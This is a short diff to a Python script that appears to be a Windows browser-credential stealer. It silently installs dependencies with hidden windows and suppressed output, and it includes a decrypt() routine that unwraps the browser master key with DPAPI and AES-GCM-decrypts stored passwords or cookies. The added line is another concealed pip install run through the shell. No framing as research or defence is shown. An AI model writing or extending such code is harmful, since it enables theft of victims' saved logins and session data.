@@ -46,6 +46,7 @@ except ImportError as e:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', e.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         os.system('pip install pycryptodome pypiwin32 requests')
+        subprocess.run(f"pip install pycryptodome pypiwin32 requests", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 time.sleep(3)
 def decrypt(buff, master_key):
     try:return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
